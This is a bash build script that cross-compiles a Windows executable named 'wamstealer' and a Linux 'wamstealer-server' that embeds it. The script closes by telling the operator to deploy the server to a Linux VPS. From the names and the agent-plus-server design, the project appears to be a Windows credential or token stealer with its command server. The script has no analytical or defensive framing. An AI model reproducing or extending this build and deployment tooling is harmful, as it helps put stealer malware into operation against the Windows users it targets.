#!/usr/bin/env bash
set -euo pipefail

cd -- "$(dirname -- "${BASH_SOURCE[0]}")"

for tool in x86_64-w64-mingw32-gcc x86_64-w64-mingw32-dlltool; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        printf 'Missing %s. Install the MinGW-w64 x64 GCC and binutils packages.\n' "$tool" >&2
        exit 1
    fi
done

cargo build --locked --release --target x86_64-pc-windows-gnu -p wamstealer
cargo build --locked --release -p wamstealer-server

printf 'Built %s\n' "$PWD/target/x86_64-pc-windows-gnu/release/wamstealer.exe"
printf 'Built %s\n' "$PWD/target/release/wamstealer-server"
printf 'wamstealer-server embeds the agent executable; deploy it to the Linux VPS.\n'
